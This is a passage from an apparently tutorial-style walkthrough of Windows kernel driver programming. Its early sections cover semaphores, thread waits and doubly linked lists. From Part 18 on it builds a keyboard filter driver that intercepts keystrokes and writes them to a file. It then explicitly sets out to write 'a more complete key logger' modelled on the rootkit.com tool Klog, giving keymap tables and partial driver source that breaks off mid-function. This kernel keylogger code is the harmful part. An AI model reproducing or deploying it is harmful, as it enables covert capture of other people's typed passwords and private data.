We change the second parameter to 1 thus making the initial value of the semaphore 1. Thus the `WaitForSingleObject` function does not wait at all as the semaphore is in a signaled state.

### P12
`r.c`
```c 
#include <ntddk.h>
#include <malloc.h>
KSEMAPHORE sem;
void abc(void * p) {
    int i;
    for (i = 0; i <= 10; i++)
        DbgPrint("abc %d", i);
    KeReleaseSemaphore( & sem, 0, 1, FALSE);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    int i;
    LARGE_INTEGER j;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 %d", MAXLONG);
    KeInitializeSemaphore( & sem, 0, MAXLONG);
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    DbgPrint("After Thread Before Wait");
    j.QuadPart = 50;
    i = KeWaitForSingleObject( & sem, Executive, KernelMode, 0, & j);
    DbgPrint("After Thread After Wait i=%x %x", i, STATUS_TIMEOUT);
    return 0;
}
```
```
Vijay2 2147483647
After Thread Before Wait
After Thread After Wait i=102 102
abc 0
abc 10
Driver Unload
```
The last parameter of the `KeWaitForSingleObject` function is a time out option. If such a option was not available, the driver may wait for ever for an event to occur. Now it will wait either for the vent or the timeout whichever is first. Thus we specify the address of a large integer specifying in the `QuadPart` member how long the function should wait.
The time is in 100 nanosecond units. We ask the Wait function to wait for 50 units which get over very soon. The return value tells us how the Wait function terminated. If it returns `0`, then the event took place, if `STATUS_TIMEOUT` or `102`, then a timeout happened.
A good idea to use the timeout option and not use 0 which means a infinite wait.

### P13
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
KSEMAPHORE sem;
void abc(void * p) {
    int i;
    for (i = 0; i <= 10; i++)
        DbgPrint("abc %d", i);
    KeReleaseSemaphore( & sem, 0, 2, FALSE);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 %d", MAXLONG);
    KeInitializeSemaphore( & sem, 0, MAXLONG); // set 0 to 1 and no wait
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    DbgPrint("After Thread Before Wait");
    KeWaitForSingleObject( & sem, Executive, KernelMode, 0, 0);
    KeWaitForSingleObject( & sem, Executive, KernelMode, 0, 0);
    DbgPrint("After Thread After Wait");
    return 0;
}
```
```
Vijay2 2147483647
After Thread Before Wait
abc 0
abc 10
After Thread After Wait
Driver Unload
```
The above program has two identical `Wait` functions. Thus someone has to set the semaphore to 2 otherwise we will not cross the two wait functions. In the abc function we set the value of the semaphore to 2 and not 1. Had we set it to 1, then we would cross the first Wait function and wait forever at the second.
Enough of semaphores for the moment, lets move on. Before that a short summary. A semaphore is used to let someone wait for someone else. Thus we are waiting at driver entry until the thread finishes. Thus they are called a mechanism for synchronizing access.

### P13a
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
void abc(void * p) {
    int i;
    for (i = 0; i <= 10; i++)
        DbgPrint("abc %d", i);
}
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    HANDLE hThread, ThreadObj;
    PsCreateSystemThread( & hThread, 0, 0, 0, 0, abc, 0);
    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, 0, KernelMode, & ThreadObj, 0);
    DbgPrint("Vijay2");
    KeWaitForSingleObject(ThreadObj, Executive, KernelMode, 0, 0);
    DbgPrint("After Wait");
    d -> DriverUnload = Unload;
    return 0;
}
```
```
abc 0
abc 10
After Wait
Driver Unload
```
When we create a thread we would like to wait for the thread to finish and then carry on. The only problem is the Wait function wants the `ETHREAD` pointer and not the thread handle. Thus we convert the handle and pass this pointer to the wait function. Now the Wait function waits for the thread to finish and then moves on.
We have learned two ways of getting something to wait for us, using a semaphore or using the wait function with a thread.
### p14
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
LIST_ENTRY List;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 Flink=%x Blink=%x List=%x", List.Flink, List.Blink, & List);
    InitializeListHead( & List);
    DbgPrint("After Flink=%x Blink=%x", List.Flink, List.Blink);
    return 0;
}
```
```
Vijay2 Flink=0 Blink=0 List= eb75b050
After Flink=eb75b050 Blink=eb75b050
Driver Unload
```
When we explained processes we saw that the driver world loved working with doubly linked lists. This data structure is ideal for moving though structures in either direction. Each linked list had a LIST_ENTRY structure which in turn had two pointers Flink and Blink which pointed to similar liked lists.

If we have to build a doubly link list, we have to write code to add and remove entities from this linked list by fiddling around the `Flink` and `Blink` pointers. Instead of we doing all this, lets use a set of functions to handle it.

We create a global variable List of type `LIST_ENTRY`. We first print the address of this structure and it gives us `eb75b050`. As it is a global variable both `Flink` and `Blink` are set to `0`.

We then use the function `InitializeListHead` passing it the address of the head of this list head. This function does a simple thing, it set both `Blink` and `Flink` to the start of the `List` structure as our list is empty. Thus both `Flink` and `Blink` point to the same value, the `List` or `Head` structure.
### P15
`r.c`
```c
#include <ntddk.h>
#include <malloc.h>
LIST_ENTRY List;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    LIST_ENTRY * p, * p1;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 Flink=%x Blink=%x List=%x", List.Flink, List.Blink, & List);
    InitializeListHead( & List);
    DbgPrint("After Flink=%x Blink=%x", List.Flink, List.Blink);
    p = (LIST_ENTRY * ) ExAllocatePool(PagedPool, sizeof(LIST_ENTRY));
    DbgPrint("p = %x", p);
    InsertTailList( & List, p);
    DbgPrint("After Insert Flink=%x Blink=%x", List.Flink, List.Blink);
    p = (LIST_ENTRY * ) ExAllocatePool(PagedPool, sizeof(LIST_ENTRY));
    DbgPrint("p = %x", p);
    InsertTailList( & List, p);
    DbgPrint("After Insert Flink=%x Blink=%x", List.Flink, List.Blink);
    p1 = List.Blink;
    DbgPrint("After Insert Flink=%x Blink=%x", p1 -> Flink, p1 -> Blink);
    p1 = p1 -> Blink;
    DbgPrint("After Insert Flink=%x Blink=%x", p1 -> Flink, p1 -> Blink);
    return 0;
}
```
```
Vijay2 Flink=0 Blink=0 List=eb72b0e0
After Flink= eb72b0e0 Blink= eb72b0e0
p = e2fa1fe8
After Insert Flink=e2fa1fe8 Blink=e2fa1fe8
p = e2bd7528
After Insert Flink= e2fa1fe8 Blink= e2bd7528
After Insert Flink= eb72b0e0 Blink= e2fa1fe8
After Insert Flink=e2bd7528 Blink=eb72b0e0
Driver Unload
```

Lets now add some structures to the empty list we created above. We call the `InitializeListHead` function as before and in this case our structure starts at address `eb72b0e0`. To add a structure to our link list we first have to allocate memory for this structure.

The only function we know that can do this is our good old `ExAllocatePool` which allocates 8 bytes of memory starting from `e2fa1fe8`. We then call the function InsertTailList which takes two parameters, the start of the list stored in List and the `LIST_ENTRY` structure we want to add.

Both values are passed as pointers to `LIST_ENTRY` structures. All that this function does is set both Flink and Blink of list to point to this newly created structure. This is because this is the first time we are calling insert.

Earlier Blink and Flink of list had a value of `eb72b0e0`, now they have a value of p e2fa1fe8. Confusing. Not really as we have only one member in the list, `List` does not really count.

We then create another `LIST_ENTRY` structure that starts at e2bd7528. We use the InsertTailList function once again. Now when we print out the Flink and Blink structures we see something. Flink remains the same and it points to the previous or first structure at `e2fa1fe8`.

The second structure was created at e2bd7528 and Blink points to this structure as we added the structure at the end or tail. Thus for List, the Flink points to the first, Blink points to the newly added structure.

We then `p1` to point to `Blink`, the newly added `LIST_ENTRY` structure. We have not filled up any of the `Flink` or `Blink` values. Flink points to eb72b0e0 which is the addresses of the original `List` structure and `Blink` points to `e2fa1fe8` which is the previous Flink or the first structure we created.

We then set `p1` to the `Blink` and now we a circular reference again.
Flink points to the second structure we have created at `e2bd7528` and `Blink` to the `List` structure. This is how we can traverse the doubly linked lists.
P16
r.c
```c
#include <ntddk.h>
#include <malloc.h>
LIST_ENTRY List;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    LIST_ENTRY * p, * p1, * p2;
    int i;
    d -> DriverUnload = Unload;
    DbgPrint("Vijay2 Flink=%x Blink=%x List=%x", List.Flink, List.Blink, & List);
    InitializeListHead( & List);
    DbgPrint("After Flink=%x Blink=%x", List.Flink, List.Blink);
    p = (LIST_ENTRY * ) ExAllocatePool(PagedPool, sizeof(LIST_ENTRY));
    DbgPrint("p = %x", p);
    InsertTailList( & List, p);
    DbgPrint("After Insert Flink=%x Blink=%x", List.Flink, List.Blink);
    p = (LIST_ENTRY * ) ExAllocatePool(PagedPool, sizeof(LIST_ENTRY));
    DbgPrint("p = %x", p);
    InsertTailList( & List, p);
    DbgPrint("After Insert Flink=%x Blink=%x", List.Flink, List.Blink);
    p2 = RemoveTailList( & List);
    DbgPrint("After Remove Flink=%x Blink=%x p2=%x", List.Flink, List.Blink, p2);
    i = IsListEmpty( & List);
    DbgPrint("List Empty i=%d", i);
    p2 = RemoveTailList( & List);
    DbgPrint("After Remove Flink=%x Blink=%x p2=%x", List.Flink, List.Blink, p2);
    i = IsListEmpty( & List);
    DbgPrint("List Empty i=%d", i);
    return 0;
}
```
```
Vijay2 Flink=0 Blink=0 List=eb75b110
After Flink=eb75b110 Blink=eb75b110
p = e12d0468
After Insert Flink=e12d0468 Blink=e12d0468
p = e2babba8
After Insert Flink=e12d0468 Blink=e2babba8
After Remove Flink=e12d0468 Blink=e12d0468 p2=e2babba8
List Empty i=0
After Remove Flink=eb75b110 Blink=eb75b110 p2= e12d0468
List Empty i=1
Driver Unload
```
The above program lets us remove a item from our list. To quickly sum, the `List` structure starts at `eb75b110`. The first structure starts at `e12d1468` and thus both `Flink` and Blink point to this structure. The second insert begins at e2babba8 and the Blink of list points to this, `Flink` remains unchanged.

When we remove an item from the doubly linked list using the function RemoveTailList, the return value is the last item that we placed in the list the one at `e2babba8`. When we print out the Flink and Blink of list, they both point to the same single list item remaining, the first one at `e12d1468`. 

The function `IsListEmpty` returns false as we yet have one item remaining in the list. We remove the last item in the list, the remove function returns its address at `e12d0468`. The Blink and Flink now point to themselves the address of the List structure at `eb75b110`.

This is how we can remove a item from the list and the list will rearrange itself. However the function `IsListEmpty` returns a true as the `List` has no members other than the `List` Structure.

P17
r.c
```c
#include <ntddk.h>
LIST_ENTRY List;
void Unload(PDRIVER_OBJECT pDriverObject) {
    DbgPrint("Driver Unload");
}
struct zzz {
    LIST_ENTRY ls;
    int cnt;
};
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    struct zzz * z;
    int i;
    d -> DriverUnload = Unload;
    InitializeListHead( & List);
    DbgPrint("List=%x Flink=%x Blink=%x", & List, List.Flink, List.Blink);
    for (i = 0; i <= 5; i++) {
        z = (struct zzz * ) ExAllocatePool(PagedPool, sizeof(struct zzz));
        z -> cnt = 10 * i;
        InsertTailList( & List, (LIST_ENTRY * ) z);
    }
    z = (struct zzz * ) List.Flink;
    for (i = 0; i <= 10; i++) {
        DbgPrint("cnt=%d Flink=%x Blink=%x z=%x", z -> cnt, z -> ls.Flink, z -> ls.Blink, z);
        z = (struct zzz * ) z -> ls.Flink;
        if (z -> ls.Flink == List.Flink)
            break;
    }
    return 0;
}
```
List=eb76b050 Flink=eb76b050 Blink=eb76b050
cnt=0 Flink=e2d8bfe8 Blink=eb76b050 z=e2e038e8
cnt=10 Flink=e2d42d88 Blink=e2e038e8 z=e2d8bfe8
cnt=20 Flink=e2e0ae68 Blink=e2d8bfe8 z=e2d42d88
cnt=30 Flink=e2e04828 Blink=e2d42d88 z=e2e0ae68
cnt=40 Flink=e2e08be8 Blink=e2e0ae68 z=e2e04828
cnt=50 Flink=eb76b050 Blink=e2e04828 z=e2e08be8
Driver Unload
```
When we create a doubly linked list we do not do it as we did it so far. We create a list of something and we use the `LIST_ENTRY` structure to join our structures together. In the structure `zzz` we start with the `LIST_ENTRY` structure but also have a variable cnt.

Thus the basic is that we can have as many members as we like, the only criteria is that we start our structure with a `LIST_ENTRY` member. Thus we have a overhead of 8 bytes.

We first initialize our List structure as always. We then enter a for loop 6 times where we first allocate 12 bytes for our structure zzz. We then set the cnt member to 10 times the loop variable i. We then insert this newly created structure into our linked list.

Our linked list thus has 6 members. We now will display all the members using a for loop. The loop purpose goes on 10 times and not 6 times. We first set the z variable to the Flink member which points to the first structure we added. Each time in the loop we display the members of the structure.

We then set z to Flink  which points to the next structure. At some time as we are dealing with a doubly linked list, the `Flink` member will equal the `Flink` member of List. This means that we have traversed one full circle.

Time to move out of the loop. We did something similar for looping through the processes. This doubly linked list is circular.
```c
for (i = 0; i <= 5; i++) {
    z = (struct zzz * ) ExAllocatePool(PagedPool, sizeof(struct zzz));
    z -> cnt = 10 * i;
    InsertTailList( & List, (LIST_ENTRY * ) z);
}
RemoveTailList( & List);
RemoveTailList( & List);
RemoveTailList( & List);
z = (struct zzz * ) List.Flink;
```
We now add three removes from the list. We now get the following output.
```
List=eb7c3050 Flink=eb7c3050 Blink=eb7c3050
cnt=0 Flink=e12f8d08 Blink=eb7c3050 z=e2e9f2a8
cnt=10 Flink=e2c28da8 Blink=e2e9f2a8 z=e12f8d08
cnt=20 Flink=eb7c3050 Blink=e12f8d08 z=e2c28da8
Driver Unload
```
If we change the removes as follow
```
RemoveHeadList (&List);
RemoveHeadList(&List);
RemoveHeadList(&List);
```
```
cnt=30 Flink=e2eb4d68 Blink=eb7e3050 z=e2d56568
cnt=40 Flink=e2f36d28 Blink=e2d56568 z=e2eb4d68
cnt=50 Flink=eb7e3050 Blink=e2eb4d68 z=e2f36d28
```
The function `RemoveTailList`  removes the items form the bottom, thus cnt values of 30, 40 , 50 get removed. If we use the function `RemoveHeadList`, then the items get removed from the beginning of the list. This means that items 0, 10 and 20 get removed.
### Part 18
`r.c`
```c
#include <ntddk.h>
#include <ntddkbd.h>
struct zzz {
    int i, j;
};
PDEVICE_OBJECT pactualkeyboarddevice, pgenericdevice;
UNICODE_STRING uKeyboardDeviceName;
int numPendingIrps;
void Unload(PDRIVER_OBJECT pDriverObject) {
    struct zzz * p;
    p = pDriverObject -> DeviceObject -> DeviceExtension;
    DbgPrint("Driver Unload numPendingIrps=%d %d %d", numPendingIrps, p -> i, p -> j);
    p -> i = 3000;
    IoDetachDevice(pactualkeyboarddevice);
    while (numPendingIrps > 0);
    IoDeleteDevice(pgenericdevice);
}
NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
    struct zzz * p;
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA) pIrp -> AssociatedIrp.SystemBuffer;
    p = (struct zzz * ) pDeviceObject -> DeviceExtension;
    DbgPrint("ScanCode %d Flags=%x %d %d\n", keys[0].MakeCode, keys -> Flags, p -> i, p -> j);
    p -> i = 1000;
    if (keys -> MakeCode == 30)
        keys -> MakeCode++;
    IoMarkIrpPending(pIrp);
    numPendingIrps--;
    return pIrp -> IoStatus.Status;
}
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    struct zzz * p = (struct zzz * ) pDeviceObject -> DeviceExtension;
    DbgPrint("DispatchRead %d %d", p -> i, p -> j);
    p -> i = 100;
    IoCopyCurrentIrpStackLocationToNext(pIrp);
    IoSetCompletionRoutine(pIrp, OnReadCompletion, 0, 1, 0, 0);
    numPendingIrps++;
    return IoCallDriver(pactualkeyboarddevice, pIrp);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    struct zzz * p;
    DbgPrint("Vijay2");
    d -> MajorFunction[IRP_MJ_READ] = abcRead;
    IoCreateDevice(d, 8, 0, FILE_DEVICE_KEYBOARD, 0, 1, & pgenericdevice);
    p = (struct zzz * ) pgenericdevice -> DeviceExtension;
    p -> i = 3;
    p -> j = 30;
    pgenericdevice -> Flags = pgenericdevice -> Flags | DO_BUFFERED_IO;
    RtlInitUnicodeString( & uKeyboardDeviceName, L "\\Device\\KeyboardClass0");
    IoAttachDevice(pgenericdevice, & uKeyboardDeviceName, & pactualkeyboarddevice);
    d -> DriverUnload = Unload;
    return 0;
}
```
```
Vijay2
DispatchRead 3 30
ScanCode 30 Flags=0 100 30
DispatchRead 1000 30
ScanCode 30 Flags=1 100 30
DispatchRead 1000 30
Driver Unload numPendingIrps=1 100 30
ScanCode 28 Flags=1 3000 30
```
The second parameter to the `IoCreateDevice` function was always 0. Now we pass a value of `8`. The function creates a `DEVICE_OBJECT` object for us pgenericdevice. This has a member called DeviceExtension that points to an area of memory 8 bytes large that has been allocated by the function.

Remember we do not allocate this memory. It gets allocated internally by the `IoCreateDevice` function. We cast this member to a structure zzz that has two int’s I and j which we set to 3 and 30.

The first function to be called is abcRead which is passed a DEVICE_OBJECT pointer as the first parameter. The DeviceExtension member we cast to a `zzz` pointer and print the value of I and j which will be 3 and 30.

Thus every function normally gets passed a `DEVICE_OBJECT` pointer and thus we can get access to the values passed in DriverEntry. We change the value of `I` to `100` and when the function `OnReadCompletion` gets called the value of `I` is `100`. This is way of passing parameters between different function in our driver.

As Unload gets called before the last `OnReadCompletion` gets called we change the value of  `I` to `3000` and this is the value we see displayed on the last call. Thus in `IoCreateDevice` we allocate a black of memory which gets passed to every function like the context parameter of the thread.

This is the preferred way of passing parameters instead of using global variables.
### P19
r.c
```c
#include <ntddk.h>
#include <ntddkbd.h>
char KeyMap[84] = {
    ' ', //0
    ' ', //1
    '1', //2
    '2', //3
    '3', //4
    '4', //5
    '5', //6
    '6', //7
    '7', //8
    '8', //9
    '9', //A
    '0', //B
    '-', //C
    '=', //D
    ' ', //E
    ' ', //F
    'q', //10
    'w', //11
    'e', //12
    'r', //13
    't', //14
    'y', //15
    'u', //16
    'i', //17
    'o', //18
    'p', //19
    '[', //1A
    ']', //1B
    ' ', //1C
    ' ', //1D
    'a', //1E
    's', //1F
    'd', //20
    'f', //21
    'g', //22
    'h', //23
    'j', //24
    'k', //25
    'l', //26
    ';', //27
    '\'', //28
    '`', //29
    ' ', //2A
    '\\', //2B
    'z', //2C
    'x', //2D
    'c', //2E
    'v', //2F
    'b', //30
    'n', //31
    'm', //32
    ',', //33
    '.', //34
    '/', //35
    ' ', //36
    ' ', //37
    ' ', //38
    ' ', //39
    ' ', //3A
    ' ', //3B
    ' ', //3C
    ' ', //3D
    ' ', //3E
    ' ', //3F
    ' ', //40
    ' ', //41
    ' ', //42
    ' ', //43
    ' ', //44
    ' ', //45
    ' ', //46
    '7', //47
    '8', //48
    '9', //49
    ' ', //4A
    '4', //4B
    '5', //4C
    '6', //4D
    ' ', //4E
    '1', //4F
    '2', //50
    '3', //51
    '0', //52
};
HANDLE hFile;
PDEVICE_OBJECT pactualkeyboarddevice, pgenericdevice;
UNICODE_STRING uKeyboardDeviceName;
int numPendingIrps;
LIST_ENTRY List;
struct zzz {
    LIST_ENTRY ls;
    int ch;
};
void Unload(PDRIVER_OBJECT pDriverObject) {
    struct zzz * z;
    DbgPrint("Driver Unload numPendingIrps=%d", numPendingIrps);
    IoDetachDevice(pactualkeyboarddevice);
    while (numPendingIrps > 0);
    IoDeleteDevice(pgenericdevice);
    z = (struct zzz * ) List.Flink;
    while (1) {
        ZwWriteFile(hFile, 0, 0, 0, 0, & z -> ch, 1, 0, 0);
        z = (struct zzz * ) z -> ls.Flink;
        if (z -> ls.Flink == List.Flink)
            break;
    }
    ZwClose(hFile);
}
NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA) pIrp -> AssociatedIrp.SystemBuffer;
    if (keys -> Flags == 0) {
        struct zzz * z;
        DbgPrint("ScanCode %d %c\n", keys[0].MakeCode, KeyMap[keys -> MakeCode]);
        z = (struct zzz * ) ExAllocatePool(PagedPool, sizeof(struct zzz));
        z -> ch = KeyMap[keys -> MakeCode];
        InsertTailList( & List, (LIST_ENTRY * ) z);
    }
    IoMarkIrpPending(pIrp);
    numPendingIrps--;
    return pIrp -> IoStatus.Status;
}
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    IoCopyCurrentIrpStackLocationToNext(pIrp);
    IoSetCompletionRoutine(pIrp, OnReadCompletion, 0, 1, 0, 0);
    numPendingIrps++;
    return IoCallDriver(pactualkeyboarddevice, pIrp);
}
NTSTATUS DriverEntry(PDRIVER_OBJECT d, PUNICODE_STRING r) {
    OBJECT_ATTRIBUTES attr;
    UNICODE_STRING uFileName;
    DbgPrint("Vijay2");
    InitializeListHead( & List);
    RtlInitUnicodeString( & uFileName, L "\\DosDevices\\c:\\driverm\\z.txt");
    InitializeObjectAttributes( & attr, & uFileName, OBJ_CASE_INSENSITIVE, 0, 0);
    ZwCreateFile( & hFile, GENERIC_WRITE, & attr, 0, 0, 0, 0, 0, FILE_SYNCHRONOUS_IO_NONALERT, 0, 0);
    d -> MajorFunction[IRP_MJ_READ] = abcRead;
    IoCreateDevice(d, 0, 0, FILE_DEVICE_KEYBOARD, 0, 1, & pgenericdevice);
    pgenericdevice -> Flags = pgenericdevice -> Flags | DO_BUFFERED_IO;
    RtlInitUnicodeString( & uKeyboardDeviceName, L "\\Device\\KeyboardClass0");
    IoAttachDevice(pgenericdevice, & uKeyboardDeviceName, & pactualkeyboarddevice);
    d -> DriverUnload = Unload;
    return 0;
}
```
```
ScanCode 21 y
ScanCode 57 
ScanCode 12 -
ScanCode 22 u
ScanCode 28 
z.txt
y –u
```
The above program may be long but it actually does very little that we do not already know off. We would first like to display the actual key pressed and not the scan code. There is a one to one relationship between scan code and key pressed.

We create an character array KeyMap where we specify the actual characters corresponding to the scan code. We know that the scan code for y is 21, so in the 21st member of the array we place a y.

So all that we do to display the actual character is use the scan code keys->MakeCode as an offset to the array KeyMap[keys->MakeCode]. Now we would also like to write this character to disk. We can function ZwWriteFile but the only problem is that we cannot use this function in the OnReadCompletion function. It give us a blue screen of death.

So we use the same code that we used earlier, we create a structure of type `zzz` and initialize the ch member to the actual character. We add this structure which begins with a `LIST_ENTRY` structure to a doubly linked list whose head is List.

In function `DriverUnload` we write this list to disk copying code from the earlier programs. This is why we explained the code earlier so that we could use it now. This is how we write all the keys typed by us to disk. Lets learn more so that we can write a more complete key logger.

Our inspiration is a key logger Klog that is available on the site www.rootkit.com.
```c
aa.h
#define INVALID 0X00
#define SPACE 0X01
#define ENTER 0X02
#define LSHIFT 0x03
#define RSHIFT 0x04
#define CTRL 0x05
#define ALT 0x06
char KeyMap[84] = {
    INVALID, //0
    INVALID, //1
    '1', //2
    '2', //3
    '3', //4
    '4', //5
    '5', //6
    '6', //7
    '7', //8
    '8', //9
    '9', //A
    '0', //B
    '-', //C
    '=', //D
    INVALID, //E
    INVALID, //F
    'q', //10
    'w', //11
    'e', //12
    'r', //13
    't', //14
    'y', //15
    'u', //16
    'i', //17
    'o', //18
    'p', //19
    '[', //1A
    ']', //1B
    ENTER, //1C
    CTRL, //1D
    'a', //1E
    's', //1F
    'd', //20
    'f', //21
    'g', //22
    'h', //23
    'j', //24
    'k', //25
    'l', //26
    ';', //27
    '\'', //28
    '`', //29
    LSHIFT, //2A
    '\\', //2B
    'z', //2C
    'x', //2D
    'c', //2E
    'v', //2F
    'b', //30
    'n', //31
    'm', //32
    ',', //33
    '.', //34
    '/', //35
    RSHIFT, //36
    INVALID, //37
    ALT, //38
    SPACE, //39
    INVALID, //3A
    INVALID, //3B
    INVALID, //3C
    INVALID, //3D
    INVALID, //3E
    INVALID, //3F
    INVALID, //40
    INVALID, //41
    INVALID, //42
    INVALID, //43
    INVALID, //44
    INVALID, //45
    INVALID, //46
    '7', //47
    '8', //48
    '9', //49
    INVALID, //4A
    '4', //4B
    '5', //4C
    '6', //4D
    INVALID, //4E
    '1', //4F
    '2', //50
    '3', //51
    '0', //52
};
char ExtendedKeyMap[84] = {
    INVALID, //0
    INVALID, //1
    '!', //2
    '@', //3
    '#', //4
    '$', //5
    '%', //6
    '^', //7
    '&', //8
    '*', //9
    '(', //A
    ')', //B
    '_', //C
    '+', //D
    INVALID, //E
    INVALID, //F
    'Q', //10
    'W', //11
    'E', //12
    'R', //13
    'T', //14
    'Y', //15
    'U', //16
    'I', //17
    'O', //18
    'P', //19
    '{', //1A
    '}', //1B
    ENTER, //1C
    INVALID, //1D
    'A', //1E
    'S', //1F
    'D', //20
    'F', //21
    'G', //22
    'H', //23
    'J', //24
    'K', //25
    'L', //26
    ':', //27
    '"', //28
    '~', //29
    LSHIFT, //2A
    '|', //2B
    'Z', //2C
    'X', //2D
    'C', //2E
    'V', //2F
    'B', //30
    'N', //31
    'M', //32
    '<', //33
    '>', //34
    '?', //35
    RSHIFT, //36
    INVALID, //37
    INVALID, //38
    SPACE, //39
    INVALID, //3A
    INVALID, //3B
    INVALID, //3C
    INVALID, //3D
    INVALID, //3E
    INVALID, //3F
    INVALID, //40
    INVALID, //41
    INVALID, //42
    INVALID, //43
    INVALID, //44
    INVALID, //45
    INVALID, //46
    '7', //47
    '8', //48
    '9', //49
    INVALID, //4A
    '4', //4B
    '5', //4C
    '6', //4D
    INVALID, //4E
    '1', //4F
    '2', //50
    '3', //51
    '0', //52
};
```
`r.c`
```c
#include "ntddk.h"
#include "ntddkbd.h"
#include "aa.h"
typedef BOOLEAN bool;
struct KEY_STATE {
    bool kSHIFT;
    bool kCAPSLOCK;
    bool kCTRL;
    bool kALT;
};
struct KEY_DATA {
    LIST_ENTRY ListEntry;
    char KeyData;
    char KeyFlags;
};
typedef struct {
    PDEVICE_OBJECT pakd;
    PETHREAD pThreadObj;
    bool bThreadTerminate;
    HANDLE hLogFile;
    struct KEY_STATE kState;
    KSEMAPHORE sem;
    KSPIN_LOCK spin;
    LIST_ENTRY List;
}
zzz, * Pzzz;
int numPendingIrps = 0;
NTSTATUS DispatchPassDown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    DbgPrint("DispatchPassDown");
    IoSkipCurrentIrpStackLocation(pIrp);
    return IoCallDriver(((Pzzz) pDeviceObject -> DeviceExtension) -> pakd, pIrp);
}
VOID Unload(PDRIVER_OBJECT p) {
    Pzzz pzzz = (Pzzz) p -> DeviceObject -> DeviceExtension;
    IoDetachDevice(pzzz -> pakd);
    DbgPrint("Unload numPendingIrps=%d", numPendingIrps);
    while (numPendingIrps > 0) {}
    pzzz -> bThreadTerminate = 1;
    KeReleaseSemaphore( & pzzz -> sem, 0, 1, TRUE);
    DbgPrint("Unload Before Wait");
    KeWaitForSingleObject(pzzz -> pThreadObj, Executive, KernelMode, 0, NULL);
    DbgPrint("Unload After Wait");
    ZwClose(pzzz -> hLogFile);
    IoDeleteDevice(p -> DeviceObject);
    return;
}
NTSTATUS abcReadOver(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
    Pzzz pzzz = (Pzzz) pDeviceObject -> DeviceExtension;
    if (pIrp -> IoStatus.Status == STATUS_SUCCESS) {
        int i;
        PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA) pIrp -> AssociatedIrp.SystemBuffer;
        int numKeys = pIrp -> IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
        DbgPrint("abcReadOver numKeys=%d Flags=%d Scancode=%d", numKeys, keys[0].Flags, keys[0].MakeCode);
        for (i = 0; i < numKeys; i++) {
            struct KEY_DATA * kData = (struct KEY_DATA * ) ExAllocatePool(NonPagedPool, sizeof(struct KEY_DATA));
            kData -> KeyData = (char) keys[i].MakeCode;
            kData -> KeyFlags = (char) keys[i].Flags;
            ExInterlockedInsertTailList( & pzzz -> List, kData, & pzzz -> spin);
            KeReleaseSemaphore( & pzzz -> sem, 0, 1, FALSE);
        }
    }
    DbgPrint("abcReadOver After Semaphore Release numPendingIrps=%d", numPendingIrps);
    if (pIrp -> PendingReturned)
        IoMarkIrpPending(pIrp);
    numPendingIrps--;
    return pIrp -> IoStatus.Status;
}
NTSTATUS abcRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
    PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
    DbgPrint("abcRead numPendingIrps=%d", numPendingIrps);
    * nextIrpStack = * currentIrpStack;
    IoSetCompletionRoutine(pIrp, abcReadOver, pDeviceObject, TRUE, TRUE, TRUE);
    numPendingIrps++;
    return IoCallDriver(((Pzzz) pDeviceObject -> DeviceExtension) -> pakd, pIrp);
}
VOID abc(PVOID pContext) {
    Pzzz pzzz = (Pzzz) pContext;
    PDEVICE_OBJECT pakd = pzzz -> pakd;
    PLIST_ENTRY pListEntry;
    struct KEY_DATA * kData;
    while (1) {
        char keys[3] = {
            0
        };
        char key = 0;
        KEVENT event = {
            0
        };
        KEYBOARD_INDICATOR_PARAMETERS indParams = {
            0
        };
        IO_STATUS_BLOCK ioStatus = {
            0
        };
        struct KEY_DATA * z;
        NTSTATUS status = {
            0
        };
        int caps, num, scroll;
        PIRP irp;
        DbgPrint("Before Wait for semaphore in thread");
        KeWaitForSingleObject( & pzzz -> sem, Executive, KernelMode, FALSE, NULL);
        DbgPrint("After Wait for semaphore in thread");
